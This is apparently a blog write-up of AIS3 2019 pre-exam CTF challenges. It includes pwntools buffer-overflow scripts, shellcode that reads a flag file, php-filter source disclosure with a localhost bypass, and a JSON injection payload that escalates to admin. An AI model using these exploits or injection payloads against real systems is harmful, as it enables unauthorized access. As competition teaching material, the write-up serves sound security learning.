---
title: ais3_2019_pre_exam_writeup
date: 2019-07-13 09:32:14
tags:
- ais3
- ctf
- writeup
---

# Pwn


## Welcome BOF

* 用objdump 或 ida 知道 [rbp-30h] ，必須壓過48 + 8 個byte，才能到return_address，但奇怪的是蓋48才過??

* 然後要跳的這`0000000000400687 <welcome_to_ais3_2019>`

* 利用pwntools

```py
from pwn import *
context(arch = 'i386', os = 'linux')

host = 'pre-exam-pwn.ais3.org'
port = 10001

r = remote(host, port)

p = 0x0000000000400687
payload = p64(p)


r.recvline()
r.sendline('A'*48 + payload)

r.interactive()

```

## ORW


* x86-64的結構
* 裡用shellcraft產的shell-code，注入輸入點
* 一樣查看buffer-overflow的點，跳到.data的address`0x00000000006010A0`，利用ida查看

```py
from pwn import *
context(arch = 'amd64', os = 'linux')


host = 'pre-exam-pwn.ais3.org'
port = 10001

r = remote(host, port)

# debug
'''
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']
if args.G:
    gdb.attach(p)
'''


shellcode = ''
shellcode += shellcraft.pushstr('/home/orw/flag')
shellcode += shellcraft.open('rsp', 0, 0)
shellcode += shellcraft.read('rax', 'rsp', 100)
shellcode += shellcraft.write(1, 'rsp', 100)

'''
log.info(shellcode)
'''

log.info(shellcode)
r.recvline()

r.sendline(asm(shellcode))
r.recvline()
p = 0x00000000006010A0
r.sendline('A'*40 + p64(p))
r.interactive()

```

# reverse

## Trivial

* 用ida組出flag


# web

## SimpleWindow

* 須利用離線版查看，可利用chorme工具改成offline顯示

## Hidden

* 在console中跑jscode，運行r()的function

## d1v1n6

* phpfilter，把index.php打包起來
* decode之後發現不能用127.0.0.1，0.0.0.0
* filter 包起 http://localhost
* decode出來就是結果


# Crypto

## TCash
* 將上面的ascii字元用md5 & sha256照做一次，會有一張表
* 將兩個的結果做比對，取交集就是flag

```py
from hashlib import md5,sha256
cand = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPWRSTUVWXYZ1234567890@,- _{}'

md5dic = {}
sha256dic = {}
'''
f = open('news.txt','w')
f2 = open('news2.txt','w')
'''
md5s = [41, 63, 46, 51, 6, 26, 42, 50, 44, 33, 29, 50, 27, 28, 30, 17, 31, 19, 46, 50, 33, 45, 26, 26, 29, 31, 52, 33, 1, 45, 31, 22, 50, 50, 50, 50, 50, 31, 22, 50, 44, 26, 44, 49, 50, 49, 26, 45, 31, 30, 22, 44, 30, 31, 17, 50, 50, 50, 31, 43, 52, 50, 53, 31, 30, 17, 26, 31, 46, 41, 44, 26, 31, 52, 50, 30, 31, 26, 39, 31, 46, 33, 27, 1, 42, 50, 31, 30, 12, 26, 27, 52, 31, 30, 12, 31, 46, 26, 27, 14, 50, 31, 22, 52, 33, 31, 41, 50, 46, 31, 22, 23, 41, 31, 53, 26, 21, 31, 33, 30, 31, 19, 39, 51, 33, 30, 39, 51, 12, 58, 60, 31, 41, 33, 53, 31, 3, 17, 50, 31, 51, 26, 29, 52, 31, 33, 22, 26, 31, 41, 51, 54, 41, 29, 52, 31, 19, 23, 33, 30, 44, 26, 27, 38, 8, 50, 29, 15]
sha256s = [61, 44, 3, 14, 22, 41, 43, 30, 49, 59, 58, 30, 11, 3, 24, 35, 40, 46, 3, 42, 59, 36, 41, 41, 41, 40, 9, 59, 23, 36, 40, 33, 42, 42, 42, 42, 42, 40, 44, 42, 49, 24, 49, 28, 42, 33, 24, 36, 40, 24, 33, 10, 24, 40, 35, 42, 42, 42, 40, 39, 9, 42, 3, 40, 24, 35, 24, 40, 3, 61, 49, 24, 40, 9, 42, 24, 40, 41, 17, 40, 12, 57, 11, 23, 43, 42, 40, 24, 18, 41, 11, 9, 40, 24, 18, 40, 3, 41, 11, 12, 42, 40, 44, 9, 59, 40, 61, 42, 3, 40, 44, 13, 61, 40, 3, 24, 29, 40, 59, 24, 40, 19, 18, 6, 59, 24, 18, 6, 22, 0, 39, 40, 61, 57, 3, 40, 17, 35, 42, 40, 58, 24, 58, 9, 40, 59, 44, 24, 40, 61, 48, 52, 61, 58, 9, 40, 19, 13, 59, 24, 53, 41, 11, 55, 55, 42, 58, 18]


for i in cand:
	md5dic.setdefault(int(md5(i.encode()).hexdigest(),16) % 64, []).append(i)
	sha256dic.setdefault(int(sha256(i.encode()).hexdigest(),16) % 64, []).append(i)

for i, j in zip(md5s, sha256s):
	for ii in md5dic[i]:
		if ii in sha256dic[j]:
			print(str(ii), end='')	# print(md5dic[i], sha256dic[j], end='\n\n')
```


# Misc

## Welcome

* 簽到題

## KcufsJ

* 將code reverse 然後 run

## Are you admin?

* command injection
	* 讓name 對到 fucker
	* is_admin 對到 yes
	* 接下來讓隨便的東西對到dictionary，才能將is_admin做忽略
	* 最後再補上一個對照，因為最後有個引號

`{\"name\":\"#{name}\",\"is_admin\":\"no\", \"age\":\"#{age}\"}`

* `fucker","is_admin":"yes","2":{"a":"b`
* `18"},"1":"2`